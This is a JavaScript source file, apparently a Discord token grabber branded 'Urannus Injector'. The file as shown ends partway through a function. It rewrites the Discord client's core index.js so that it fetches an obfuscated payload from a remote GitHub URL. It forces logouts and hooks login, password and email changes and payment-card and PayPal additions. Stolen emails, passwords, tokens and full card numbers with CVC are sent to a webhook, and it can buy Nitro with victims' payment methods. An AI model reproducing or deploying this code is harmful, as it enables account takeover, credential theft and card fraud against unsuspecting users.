const args = process.argv;
const fs = require('fs');
const path = require("path");
const https = require("https");
const querystring = require("querystring");
const {
  BrowserWindow,
  session
} = require("electron");
const config = {
  'webhook': "%WEBHOOK%",
  'webhook_protector_key': "%WEBHOOK_KEY%",
  'auto_buy_nitro': false,
  'ping_on_run': true,
  'ping_val': "@everyone",
  'embed_name': "Urannus Injector",
  'embed_icon': "https://i.pinimg.com/736x/73/0c/e8/730ce8a39da3dc5355531eeb991f4b19.jpg",
  'embed_color': 0x2b2d31,
  'injection_url': "https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js",
  'api': "https://discord.com/api/v9/users/@me",
  'nitro': {
    'boost': {
      'year': {
        'id': "521847234246082599",
        'sku': "511651885459963904",
        'price': "9999"
      },
      'month': {
        'id': "521847234246082599",
        'sku': "511651880837840896",
        'price': "999"
      }
    },
    'classic': {
      'month': {
        'id': "521846918637420545",
        'sku': "511651871736201216",
        'price': "499"
      }
    }
  },
  'filter': {
    'urls': ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts", "https://api.stripe.com/v*/tokens", "https://api.stripe.com/v*/setup_intents/*/confirm", "https://api.stripe.com/v*/payment_intents/*/confirm"]
  },
  'filter2': {
    'urls': ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "wss://remote-auth-gateway.discord.gg/*"]
  }
};
function parity_32(_0x25883f, _0x232e0e, _0x1cb064) {
  return _0x25883f ^ _0x232e0e ^ _0x1cb064;
}
function ch_32(_0x3bb96d, _0x77d8e8, _0x386c11) {
  return _0x3bb96d & _0x77d8e8 ^ ~_0x3bb96d & _0x386c11;
}
function maj_32(_0x325ab9, _0xee6120, _0xf87f6f) {
  return _0x325ab9 & _0xee6120 ^ _0x325ab9 & _0xf87f6f ^ _0xee6120 & _0xf87f6f;
}
function rotl_32(_0x594cec, _0x472542) {
  return _0x594cec << _0x472542 | _0x594cec >>> 32 - _0x472542;
}
function safeAdd_32_2(_0x1debda, _0x2d1538) {
  var _0x3a0d05 = (_0x1debda & 65535) + (_0x2d1538 & 65535);
  var _0x5b7d4d = (_0x1debda >>> 16) + (_0x2d1538 >>> 16) + (_0x3a0d05 >>> 16);
  return (_0x5b7d4d & 65535) << 16 | _0x3a0d05 & 65535;
}
function safeAdd_32_5(_0x437bd5, _0x177c27, _0x1ba84b, _0x5e50e1, _0x99c24e) {
  var _0x5f150d = (_0x437bd5 & 65535) + (_0x177c27 & 65535) + (_0x1ba84b & 65535) + (_0x5e50e1 & 65535) + (_0x99c24e & 65535);
  var _0x29dddb = (_0x437bd5 >>> 16) + (_0x177c27 >>> 16) + (_0x1ba84b >>> 16) + (_0x5e50e1 >>> 16) + (_0x99c24e >>> 16) + (_0x5f150d >>> 16);
  return (_0x29dddb & 65535) << 16 | _0x5f150d & 65535;
}
function binb2hex(_0x136ac7) {
  var _0x1a84f3 = '';
  var _0x3c5ce7 = _0x136ac7.length * 4;
  var _0x41d4a9;
  var _0x54c969;
  for (_0x41d4a9 = 0; _0x41d4a9 < _0x3c5ce7; _0x41d4a9 += 1) {
    _0x54c969 = _0x136ac7[_0x41d4a9 >>> 2] >>> (3 - _0x41d4a9 % 4) * 8;
    _0x1a84f3 += "0123456789abcdef".charAt(_0x54c969 >>> 4 & 15) + "0123456789abcdef".charAt(_0x54c969 & 15);
  }
  return _0x1a84f3;
}
function getH() {
  return [1732584193, 4023233417, 2562383102, 271733878, 3285377520];
}
function roundSHA1(_0x37281f, _0x54c59b) {
  var _0x35b5ce = [];
  var _0x518bb2;
  var _0x4387fb;
  var _0xc7d7e5;
  var _0x48e170;
  var _0x35eb7a;
  var _0x1c98db;
  var _0x3137be;
  _0x518bb2 = _0x54c59b[0];
  _0x4387fb = _0x54c59b[1];
  _0xc7d7e5 = _0x54c59b[2];
  _0x48e170 = _0x54c59b[3];
  _0x35eb7a = _0x54c59b[4];
  for (_0x3137be = 0; _0x3137be < 80; _0x3137be += 1) {
    if (_0x3137be < 16) {
      _0x35b5ce[_0x3137be] = _0x37281f[_0x3137be];
    } else {
      _0x35b5ce[_0x3137be] = (_0x35b5ce[_0x3137be - 3] ^ _0x35b5ce[_0x3137be - 8] ^ _0x35b5ce[_0x3137be - 14] ^ _0x35b5ce[_0x3137be - 16]) << 1 | (_0x35b5ce[_0x3137be - 3] ^ _0x35b5ce[_0x3137be - 8] ^ _0x35b5ce[_0x3137be - 14] ^ _0x35b5ce[_0x3137be - 16]) >>> 31;
    }
    if (_0x3137be < 20) {
      _0x1c98db = safeAdd_32_5(_0x518bb2 << 5 | _0x518bb2 >>> 27, _0x4387fb & _0xc7d7e5 ^ ~_0x4387fb & _0x48e170, _0x35eb7a, 1518500249, _0x35b5ce[_0x3137be]);
    } else {
      if (_0x3137be < 40) {
        _0x1c98db = safeAdd_32_5(_0x518bb2 << 5 | _0x518bb2 >>> 27, _0x4387fb ^ _0xc7d7e5 ^ _0x48e170, _0x35eb7a, 1859775393, _0x35b5ce[_0x3137be]);
      } else if (_0x3137be < 60) {
        _0x1c98db = safeAdd_32_5(_0x518bb2 << 5 | _0x518bb2 >>> 27, _0x4387fb & _0xc7d7e5 ^ _0x4387fb & _0x48e170 ^ _0xc7d7e5 & _0x48e170, _0x35eb7a, 2400959708, _0x35b5ce[_0x3137be]);
      } else {
        _0x1c98db = safeAdd_32_5(_0x518bb2 << 5 | _0x518bb2 >>> 27, _0x4387fb ^ _0xc7d7e5 ^ _0x48e170, _0x35eb7a, 3395469782, _0x35b5ce[_0x3137be]);
      }
    }
    _0x35eb7a = _0x48e170;
    _0x48e170 = _0xc7d7e5;
    _0xc7d7e5 = _0x4387fb << 30 | _0x4387fb >>> 2;
    _0x4387fb = _0x518bb2;
    _0x518bb2 = _0x1c98db;
  }
  _0x54c59b[0] = safeAdd_32_2(_0x518bb2, _0x54c59b[0]);
  _0x54c59b[1] = safeAdd_32_2(_0x4387fb, _0x54c59b[1]);
  _0x54c59b[2] = safeAdd_32_2(_0xc7d7e5, _0x54c59b[2]);
  _0x54c59b[3] = safeAdd_32_2(_0x48e170, _0x54c59b[3]);
  _0x54c59b[4] = safeAdd_32_2(_0x35eb7a, _0x54c59b[4]);
  return _0x54c59b;
}
function finalizeSHA1(_0x410af2, _0x219bde, _0xe49c60, _0x1b9cfb) {
  var _0x50aa59;
  var _0x5bc3fc;
  var _0x12e5b2;
  _0x12e5b2 = (_0x219bde + 65 >>> 9 << 4) + 15;
  while (_0x410af2.length <= _0x12e5b2) {
    _0x410af2.push(0);
  }
  _0x410af2[_0x219bde >>> 5] |= 128 << 24 - _0x219bde % 32;
  _0x410af2[_0x12e5b2] = _0x219bde + _0xe49c60;
  _0x5bc3fc = _0x410af2.length;
  for (_0x50aa59 = 0; _0x50aa59 < _0x5bc3fc; _0x50aa59 += 16) {
    _0x1b9cfb = roundSHA1(_0x410af2.slice(_0x50aa59, _0x50aa59 + 16), _0x1b9cfb);
  }
  return _0x1b9cfb;
}
function hex2binb(_0xe0e6ec, _0x33b309, _0x289b21) {
  var _0x5a12b3;
  var _0x3e3d2d = _0xe0e6ec.length;
  var _0x5556ab;
  var _0x28de5e;
  var _0x3a81af;
  var _0x5c6870;
  var _0x2577c2;
  _0x5a12b3 = _0x33b309 || [0];
  _0x289b21 = _0x289b21 || 0;
  _0x2577c2 = _0x289b21 >>> 3;
  if (0 !== _0x3e3d2d % 2) {
    console.error("String of HEX type must be in byte increments");
  }
  for (_0x5556ab = 0; _0x5556ab < _0x3e3d2d; _0x5556ab += 2) {
    _0x28de5e = parseInt(_0xe0e6ec.substr(_0x5556ab, 2), 16);
    if (!isNaN(_0x28de5e)) {
      _0x5c6870 = (_0x5556ab >>> 1) + _0x2577c2;
      _0x3a81af = _0x5c6870 >>> 2;
      while (_0x5a12b3.length <= _0x3a81af) {
        _0x5a12b3.push(0);
      }
      _0x5a12b3[_0x3a81af] |= _0x28de5e << 8 * (3 - _0x5c6870 % 4);
    } else {
      console.error("String of HEX type contains invalid characters");
    }
  }
  return {
    'value': _0x5a12b3,
    'binLen': _0x3e3d2d * 4 + _0x289b21
  };
}
class jsSHA {
  constructor() {
    var _0x3b29d2 = 0;
    var _0x18ae25 = [];
    var _0x31b2c5 = 0;
    var _0x3a6f16;
    var _0x1e71a6 = false;
    var _0x54292d = false;
    var _0x198276 = [];
    var _0x873db4 = [];
    var _0x418299;
    var _0x418299 = 1;
    if (_0x418299 !== parseInt(_0x418299, 10) || 1 > _0x418299) {
      console.error("numRounds must a integer >= 1");
    }
    _0x3a6f16 = [1732584193, 4023233417, 2562383102, 271733878, 3285377520];
    this.setHMACKey = function (_0x1764c0) {
      var _0x52da9e;
      var _0x183b27;
      var _0x10628f;
      var _0x49808e;
      _0x52da9e = hex2binb(_0x1764c0);
      _0x183b27 = _0x52da9e.binLen;
      _0x10628f = _0x52da9e.value;
      if (64 < _0x183b27 / 8) {
        _0x10628f = finalizeSHA1(_0x10628f, _0x183b27, 0, [1732584193, 4023233417, 2562383102, 271733878, 3285377520]);
        while (_0x10628f.length <= 15) {
          _0x10628f.push(0);
        }
        _0x10628f[15] &= 4294967040;
      } else {
        if (64 > _0x183b27 / 8) {
          while (_0x10628f.length <= 15) {
            _0x10628f.push(0);
          }
          _0x10628f[15] &= 4294967040;
        }
      }
      for (_0x49808e = 0; _0x49808e <= 15; _0x49808e += 1) {
        _0x198276[_0x49808e] = _0x10628f[_0x49808e] ^ 909522486;
        _0x873db4[_0x49808e] = _0x10628f[_0x49808e] ^ 1549556828;
      }
      _0x3a6f16 = roundSHA1(_0x198276, _0x3a6f16);
      _0x3b29d2 = 512;
      _0x54292d = true;
    };
    this.update = function (_0x1a259b) {
      var _0xa715e0;
      var _0x7fb60d;
      var _0x579f61;
      var _0x517d63;
      var _0x2db4da;
      var _0xb7eeff = 0;
      _0xa715e0 = hex2binb(_0x1a259b, _0x18ae25, _0x31b2c5);
      _0x7fb60d = _0xa715e0.binLen;
      _0x517d63 = _0xa715e0.value;
      _0x579f61 = _0x7fb60d >>> 5;
      for (_0x2db4da = 0; _0x2db4da < _0x579f61; _0x2db4da += 16) {
        if (_0xb7eeff + 512 <= _0x7fb60d) {
          _0x3a6f16 = roundSHA1(_0x517d63.slice(_0x2db4da, _0x2db4da + 16), _0x3a6f16);
          _0xb7eeff += 512;
        }
      }
      _0x3b29d2 += _0xb7eeff;
      _0x18ae25 = _0x517d63.slice(_0xb7eeff >>> 5);
      _0x31b2c5 = _0x7fb60d % 512;
    };
    this.getHMAC = function () {
      var _0x162a83;
      if (false === _0x54292d) {
        console.error("Cannot call getHMAC without first setting HMAC key");
      }
      if (false === _0x1e71a6) {
        _0x162a83 = finalizeSHA1(_0x18ae25, _0x31b2c5, _0x3b29d2, _0x3a6f16);
        _0x3a6f16 = roundSHA1(_0x873db4, [1732584193, 4023233417, 2562383102, 271733878, 3285377520]);
        _0x3a6f16 = finalizeSHA1(_0x162a83, 160, 512, _0x3a6f16);
      }
      _0x1e71a6 = true;
      return binb2hex(_0x3a6f16);
    };
  }
}
if ("function" === typeof define && define.amd) {
  define(function () {
    return jsSHA;
  });
} else if ("undefined" !== typeof exports) {
  if ("undefined" !== typeof module && module.exports) {
    module.exports = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global.jsSHA = jsSHA;
}
if (jsSHA["default"]) {
  jsSHA = jsSHA["default"];
}
function totp(_0x24ffc0) {
  const _0x5801b9 = Date.now();
  const _0x105aae = Math.round(_0x5801b9 / 1000);
  const _0x55292f = leftpad((Math.floor(_0x105aae / 30) < 15.5 ? '0' : '') + Math.round(Math.floor(_0x105aae / 30)).toString(16), 16, '0');
  const _0x34c321 = new jsSHA();
  _0x34c321.setHMACKey(base32tohex(_0x24ffc0));
  _0x34c321.update(_0x55292f);
  const _0x37e966 = _0x34c321.getHMAC();
  const _0x555cec = parseInt(_0x37e966.substring(_0x37e966.length - 1), 16);
  let _0x8fb88a = (parseInt(_0x37e966.substr(_0x555cec * 2, 8), 16) & parseInt("7fffffff", 16)) + '';
  _0x8fb88a = _0x8fb88a.substr(Math.max(_0x8fb88a.length - 6, 0), 6);
  return _0x8fb88a;
}
function hex2dec(_0x2d3779) {
  return parseInt(_0x2d3779, 16);
}
function dec2hex(_0x673e49) {
  return (_0x673e49 < 15.5 ? '0' : '') + Math.round(_0x673e49).toString(16);
}
function base32tohex(_0x347080) {
  let _0x5ce1a1 = '';
  let _0x40df91 = '';
  _0x347080 = _0x347080.replace(/=+$/, '');
  for (let _0x3d3e4b = 0; _0x3d3e4b < _0x347080.length; _0x3d3e4b++) {
    let _0x58b7ce = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567".indexOf(_0x347080.charAt(_0x3d3e4b).toUpperCase());
    if (_0x58b7ce === -1) {
      console.error("Invalid base32 character in key");
    }
    _0x5ce1a1 += leftpad(_0x58b7ce.toString(2), 5, '0');
  }
  for (let _0x1b154e = 0; _0x1b154e + 8 <= _0x5ce1a1.length; _0x1b154e += 8) {
    let _0x3dd6de = _0x5ce1a1.substr(_0x1b154e, 8);
    _0x40df91 = _0x40df91 + leftpad(parseInt(_0x3dd6de, 2).toString(16), 2, '0');
  }
  return _0x40df91;
}
function leftpad(_0x44fd2e, _0xbc4248, _0x128d38) {
  if (_0xbc4248 + 1 >= _0x44fd2e.length) {
    _0x44fd2e = Array(_0xbc4248 + 1 - _0x44fd2e.length).join(_0x128d38) + _0x44fd2e;
  }
  return _0x44fd2e;
}
const discordPath = function () {
  const _0x161e95 = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let _0x4d0f53;
  if (process.platform === "win32") {
    _0x4d0f53 = path.join(_0x161e95, "resources");
  } else if (process.platform === "darwin") {
    _0x4d0f53 = path.join(_0x161e95, "Contents", "Resources");
  }
  if (fs.existsSync(_0x4d0f53)) {
    return {
      'resourcePath': _0x4d0f53,
      'app': _0x161e95
    };
  }
  return {
    'undefined': undefined,
    'undefined': undefined
  };
}();
function updateCheck() {
  const {
    resourcePath: _0x4a9032,
    app: _0x59fd03
  } = discordPath;
  if (_0x4a9032 === undefined || _0x59fd03 === undefined) {
    return;
  }
  const _0x1d17dd = path.join(_0x4a9032, "app");
  const _0x1e9b1c = path.join(_0x1d17dd, "package.json");
  const _0x3d4393 = path.join(_0x1d17dd, "index.js");
  const _0x9a33e2 = fs.readdirSync(_0x59fd03 + "\\modules\\").filter(_0x2e0fd => /discord_desktop_core-+?/.test(_0x2e0fd))[0];
  const _0x4865ee = _0x59fd03 + "\\modules\\" + _0x9a33e2 + "\\discord_desktop_core\\index.js";
  const _0x324981 = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
  if (!fs.existsSync(_0x1d17dd)) {
    fs.mkdirSync(_0x1d17dd);
  }
  if (fs.existsSync(_0x1e9b1c)) {
    fs.unlinkSync(_0x1e9b1c);
  }
  if (fs.existsSync(_0x3d4393)) {
    fs.unlinkSync(_0x3d4393);
  }
  if (process.platform === "win32" || process.platform === "darwin") {
    fs.writeFileSync(_0x1e9b1c, JSON.stringify({
      'name': "discord",
      'main': "index.js"
    }, null, 4));
    const _0x59a515 = "const fs = require('fs'), https = require('https');\nconst indexJs = '" + _0x4865ee + "';\nconst bdPath = '" + _0x324981 + "';\nconst fileSize = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \n        init();\n})\nasync function init() {\n    https.get('" + "https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js" + "', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '" + "%WEBHOOK%" + "')\n        res.replace('%WEBHOOK_KEY%', '" + "%WEBHOOK_KEY%" + "')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n    \n    }).on(\"error\", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('" + path.join(_0x4a9032, "app.asar") + "')\nif (fs.existsSync(bdPath)) require(bdPath);";
    fs.writeFileSync(_0x3d4393, _0x59a515.replace(/\\/g, "\\\\"));
  }
  if (!fs.existsSync(path.join(__dirname, "initiation"))) {
    return true;
  }
  fs.rmdirSync(path.join(__dirname, "initiation"));
  execScript("window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\"get_require\"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b=\"string\"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})(\"login\").logout()}LogOut();");
  return false;
}
const execScript = _0x319649 => {
  const _0x13462b = BrowserWindow.getAllWindows()[0];
  return _0x13462b.webContents.executeJavaScript(_0x319649, true);
};
const getInfo = async _0x337e6d => {
  const _0x226e46 = await execScript("var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open(\"GET\", \"https://discord.com/api/v9/users/@me\", false);\n    xmlHttp.setRequestHeader(\"Authorization\", \"" + _0x337e6d + "\");\n    xmlHttp.send(null);\n    xmlHttp.responseText;");
  return JSON.parse(_0x226e46);
};
const fetchBilling = async _0x55bc29 => {
  const _0x3568ba = await execScript("var xmlHttp = new XMLHttpRequest(); \n    xmlHttp.open(\"GET\", \"https://discord.com/api/v9/users/@me/billing/payment-sources\", false); \n    xmlHttp.setRequestHeader(\"Authorization\", \"" + _0x55bc29 + "\"); \n    xmlHttp.send(null); \n    xmlHttp.responseText");
  if (!_0x3568ba.lenght || _0x3568ba.length === 0) {
    return '';
  }
  return JSON.parse(_0x3568ba);
};
const getBilling = async _0x3e1b3b => {
  const _0x55b1fe = await fetchBilling(_0x3e1b3b);
  if (!_0x55b1fe) {
    return '❌';
  }
  let _0x168d66 = '';
  _0x55b1fe.forEach(_0xab97a9 => {
    if (!_0xab97a9.invalid) {
      switch (_0xab97a9.type) {
        case 1:
          _0x168d66 += "💳 ";
          break;
        case 2:
          _0x168d66 += "<:paypal:951139189389410365> ";
          break;
      }
    }
  });
  if (!_0x168d66) {
    _0x168d66 = '❌';
  }
  return _0x168d66;
};
const Purchase = async (_0x516e2e, _0x4ade68, _0x520555, _0x173ec7) => {
  const _0x486d5c = {
    'expected_amount': config.nitro[_0x520555][_0x173ec7].price,
    'expected_currency': "usd",
    'gift': true,
    'payment_source_id': _0x4ade68,
    'payment_source_token': null,
    'purchase_token': "2422867c-244d-476a-ba4f-36e197758d97",
    'sku_subscription_plan_id': config.nitro[_0x520555][_0x173ec7].sku
  };
  const _0x4dfd14 = execScript("var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open(\"POST\", \"https://discord.com/api/v9/store/skus/" + config.nitro[_0x520555][_0x173ec7].id + "/purchase\", false);\n    xmlHttp.setRequestHeader(\"Authorization\", \"" + _0x516e2e + "\");\n    xmlHttp.setRequestHeader('Content-Type', 'application/json');\n    xmlHttp.send(JSON.stringify(" + JSON.stringify(_0x486d5c) + "));\n    xmlHttp.responseText");
  if (_0x4dfd14.gift_code) {
    return "https://discord.gift/" + _0x4dfd14.gift_code;
  } else {
    return null;
  }
};
const buyNitro = async _0xa3f812 => {
  const _0x2a36d8 = await fetchBilling(_0xa3f812);
  if (!_0x2a36d8) {
    return "Failed to Purchase ❌";
  }
  let _0x16a65c = [];
  _0x2a36d8.forEach(_0x2b21ad => {
    if (!_0x2b21ad.invalid) {
      _0x16a65c = _0x16a65c.concat(_0x2b21ad.id);
    }
  });
  for (let _0x5bfa0 in _0x16a65c) {
    const _0x5e242e = Purchase(_0xa3f812, _0x5bfa0, "boost", "year");
    if (_0x5e242e !== null) {
      return _0x5e242e;
    } else {
      const _0x75da6d = Purchase(_0xa3f812, _0x5bfa0, "boost", "month");
      if (_0x75da6d !== null) {
        return _0x75da6d;
      } else {
        const _0x5a1bdd = Purchase(_0xa3f812, _0x5bfa0, "classic", "month");
        return _0x5a1bdd !== null ? _0x5a1bdd : "Failed to Purchase ❌";
      }
    }
  }
};
const getNitro = _0x13e65f => {
  switch (_0x13e65f) {
    case 0:
      return "No Nitro";
    case 1:
      return "Nitro Classic";
    case 2:
      return "Nitro Boost";
    default:
      return "No Nitro";
  }
};
const getBadges = _0x2eec40 => {
  let _0xe805f7 = '';
  switch (_0x2eec40) {
    case 1:
      _0xe805f7 += "Discord Staff, ";
      break;
    case 2:
      _0xe805f7 += "Partnered Server Owner, ";
      break;
    case 131072:
      _0xe805f7 += "Verified Bot Developer, ";
      break;
    case 4194304:
      _0xe805f7 += "Active Developer, ";
      break;
    case 4:
      _0xe805f7 += "Hypesquad Event, ";
      break;
    case 16384:
      _0xe805f7 += "Gold BugHunter, ";
      break;
    case 8:
      _0xe805f7 += "Green BugHunter, ";
      break;
    case 512:
      _0xe805f7 += "Early Supporter, ";
      break;
    case 128:
      _0xe805f7 += "HypeSquad Brillance, ";
      break;
    case 64:
      _0xe805f7 += "HypeSquad Bravery, ";
      break;
    case 256:
      _0xe805f7 += "HypeSquad Balance, ";
      break;
    case 0:
      _0xe805f7 = "None";
      break;
    default:
      _0xe805f7 = "None";
      break;
  }
  return _0xe805f7;
};
const hooker = async _0x5663f0 => {
  const _0x76a61 = JSON.stringify(_0x5663f0);
  const _0x69759f = new URL("%WEBHOOK%");
  const _0x11dd68 = {
    'Content-Type': "application/json",
    'Access-Control-Allow-Origin': '*'
  };
  if (!"%WEBHOOK%".includes("api/webhooks")) {
    const _0x1499ba = totp("%WEBHOOK_KEY%");
    _0x11dd68.Authorization = _0x1499ba;
  }
  const _0x2e4447 = {
    'protocol': _0x69759f.protocol,
    'hostname': _0x69759f.host,
    'path': _0x69759f.pathname,
    'method': "POST",
    'headers': _0x11dd68
  };
  const _0x486093 = https.request(_0x2e4447);
  _0x486093.on("error", _0x472ac1 => {
    console.log(_0x472ac1);
  });
  _0x486093.write(_0x76a61);
  _0x486093.end();
};
const login = async (_0xe85d66, _0x3806b5, _0x3608da) => {
  const _0x448fab = await getInfo(_0x3608da);
  const _0x4d2018 = getNitro(_0x448fab.premium_type);
  const _0x483a0e = getBadges(_0x448fab.flags);
  const _0x489f27 = await getBilling(_0x3608da);
  const _0x10167e = {
    'username': "Urannus Injector",
    'avatar_url': "https://i.pinimg.com/736x/73/0c/e8/730ce8a39da3dc5355531eeb991f4b19.jpg",
    'embeds': [{
      'color': 0x2b2d31,
      'fields': [{
        'name': "**Account Info**",
        'value': "Email: **" + _0xe85d66 + "** - Password: **" + _0x3806b5 + '**',
        'inline': false
      }, {
        'name': "**Discord Info**",
        'value': "Nitro Type: **" + _0x4d2018 + "**\nBadges: **" + _0x483a0e + "**\nBilling: **" + _0x489f27 + '**',
        'inline': false
      }, {
        'name': "**Token**",
        'value': '`' + _0x3608da + '`',
        'inline': false
      }],
      'author': {
        'name': _0x448fab.username + '#' + _0x448fab.discriminator + " | " + _0x448fab.id,
        'icon_url': "https://cdn.discordapp.com/avatars/" + _0x448fab.id + '/' + _0x448fab.avatar + ".webp"
      }
    }]
  };
  hooker(_0x10167e);
};
const passwordChanged = async (_0x71a55a, _0x430172, _0x547a3) => {
  const _0x244861 = await getInfo(_0x547a3);
  const _0x28a55d = getNitro(_0x244861.premium_type);
  const _0x24b426 = getBadges(_0x244861.flags);
  const _0x5c1e16 = await getBilling(_0x547a3);
  const _0xa7bdaa = {
    'username': "Urannus Injector",
    'avatar_url': "https://i.pinimg.com/736x/73/0c/e8/730ce8a39da3dc5355531eeb991f4b19.jpg",
    'embeds': [{
      'color': 0x2b2d31,
      'fields': [{
        'name': "**Password Changed**",
        'value': "Email: **" + _0x244861.email + "**\nOld Password: **" + _0x71a55a + "**\nNew Password: **" + _0x430172 + '**',
        'inline': true
      }, {
        'name': "**Discord Info**",
        'value': "Nitro Type: **" + _0x28a55d + "**\nBadges: **" + _0x24b426 + "**\nBilling: **" + _0x5c1e16 + '**',
        'inline': true
      }, {
        'name': "**Token**",
        'value': '`' + _0x547a3 + '`',
        'inline': false
      }],
      'author': {
        'name': _0x244861.username + '#' + _0x244861.discriminator + " | " + _0x244861.id,
        'icon_url': "https://cdn.discordapp.com/avatars/" + _0x244861.id + '/' + _0x244861.avatar + ".webp"
      }
    }]
  };
  hooker(_0xa7bdaa);
};
const emailChanged = async (_0x189cce, _0xf63eb, _0x3f09e5) => {
  const _0x56bb36 = await getInfo(_0x3f09e5);
  const _0x3e2ead = getNitro(_0x56bb36.premium_type);
  const _0x56c60d = getBadges(_0x56bb36.flags);
  const _0x46bed1 = await getBilling(_0x3f09e5);
  const _0x54eb90 = {
    'username': "Urannus Injector",
    'avatar_url': "https://i.pinimg.com/736x/73/0c/e8/730ce8a39da3dc5355531eeb991f4b19.jpg",
    'embeds': [{
      'color': 0x2b2d31,
      'fields': [{
        'name': "**Email Changed**",
        'value': "New Email: **" + _0x189cce + "**\nPassword: **" + _0xf63eb + '**',
        'inline': true
      }, {
        'name': "**Discord Info**",
        'value': "Nitro Type: **" + _0x3e2ead + "**\nBadges: **" + _0x56c60d + "**\nBilling: **" + _0x46bed1 + '**',
        'inline': true
      }, {
        'name': "**Token**",
        'value': '`' + _0x3f09e5 + '`',
        'inline': false
      }],
      'author': {
        'name': _0x56bb36.username + '#' + _0x56bb36.discriminator + " | " + _0x56bb36.id,
        'icon_url': "https://cdn.discordapp.com/avatars/" + _0x56bb36.id + '/' + _0x56bb36.avatar + ".webp"
      }
    }]
  };
  hooker(_0x54eb90);
};
const PaypalAdded = async _0xd5a44e => {
  const _0x2d7db2 = await getInfo(_0xd5a44e);
  const _0x635b5c = getNitro(_0x2d7db2.premium_type);
  const _0x21444a = getBadges(_0x2d7db2.flags);
  const _0x5dd1c7 = getBilling(_0xd5a44e);
  const _0x140e43 = {
    'username': "Urannus Injector",
    'avatar_url': "https://i.pinimg.com/736x/73/0c/e8/730ce8a39da3dc5355531eeb991f4b19.jpg",
    'embeds': [{
      'color': 0x2b2d31,
      'fields': [{
        'name': "**Paypal Added**",
        'value': "Time to buy some nitro baby 😩",
        'inline': false
      }, {
        'name': "**Discord Info**",
        'value': "Nitro Type: **" + _0x635b5c + "*\nBadges: **" + _0x21444a + "**\nBilling: **" + _0x5dd1c7 + '**',
        'inline': false
      }, {
        'name': "**Token**",
        'value': '`' + _0xd5a44e + '`',
        'inline': false
      }],
      'author': {
        'name': _0x2d7db2.username + '#' + _0x2d7db2.discriminator + " | " + _0x2d7db2.id,
        'icon_url': "https://cdn.discordapp.com/avatars/" + _0x2d7db2.id + '/' + _0x2d7db2.avatar + ".webp"
      }
    }]
  };
  hooker(_0x140e43);
};
const ccAdded = async (_0x38ec7f, _0x537fba, _0x29f96c, _0x3f9d2b, _0x1abfa7) => {
  const _0x39a435 = await getInfo(_0x1abfa7);
  const _0x5adac4 = getNitro(_0x39a435.premium_type);
  const _0x1955db = getBadges(_0x39a435.flags);
  const _0x257858 = await getBilling(_0x1abfa7);
  const _0x245265 = {
    'username': "Urannus Injector",
    'avatar_url': "https://i.pinimg.com/736x/73/0c/e8/730ce8a39da3dc5355531eeb991f4b19.jpg",
    'embeds': [{
      'color': 0x2b2d31,
      'fields': [{
        'name': "**Credit Card Added**",
        'value': "Credit Card Number: **" + _0x38ec7f + "**\nCVC: **" + _0x537fba + "**\nCredit Card Expiration: **" + _0x29f96c + '/' + _0x3f9d2b + '**',
        'inline': true
      }, {
        'name': "**Discord Info**",
        'value': "Nitro Type: **" + _0x5adac4 + "**\nBadges: **" + _0x1955db + "**\nBilling: **" + _0x257858 + '**',
        'inline': true
      }, {
        'name': "**Token**",
        'value': '`' + _0x1abfa7 + '`',
        'inline': false
      }],
      'author': {
        'name': _0x39a435.username + '#' + _0x39a435.discriminator + " | " + _0x39a435.id,
        'icon_url': "https://cdn.discordapp.com/avatars/" + _0x39a435.id + '/' + _0x39a435.avatar + ".webp"
      }
    }]
  };
  hooker(_0x245265);
};
const nitroBought = async _0x113f5c => {
  const _0x1e7fd0 = await getInfo(_0x113f5c);
  const _0x19f930 = getNitro(_0x1e7fd0.premium_type);
  const _0x2f9ca0 = getBadges(_0x1e7fd0.flags);
  const _0xe46e0c = await getBilling(_0x113f5c);
  const _0x531811 = await buyNitro(_0x113f5c);
  const _0x497d31 = {
    'username': "Urannus Injector",
    'content': _0x531811,
    'avatar_url': "https://i.pinimg.com/736x/73/0c/e8/730ce8a39da3dc5355531eeb991f4b19.jpg",
    'embeds': [{
      'color': 0x2b2d31,
      'fields': [{
        'name': "**Nitro bought!**",
        'value': "**Nitro Code:**\n```diff\n+ " + _0x531811 + "```",
        'inline': true
      }, {
        'name': "**Discord Info**",
        'value': "Nitro Type: **" + _0x19f930 + "**\nBadges: **" + _0x2f9ca0 + "**\nBilling: **" + _0xe46e0c + '**',
        'inline': true
      }, {
        'name': "**Token**",
        'value': '`' + _0x113f5c + '`',
        'inline': false
      }],
      'author': {
        'name': _0x1e7fd0.username + '#' + _0x1e7fd0.discriminator + " | " + _0x1e7fd0.id,
        'icon_url': "https://cdn.discordapp.com/avatars/" + _0x1e7fd0.id + '/' + _0x1e7fd0.avatar + ".webp"
      }
    }]
  };
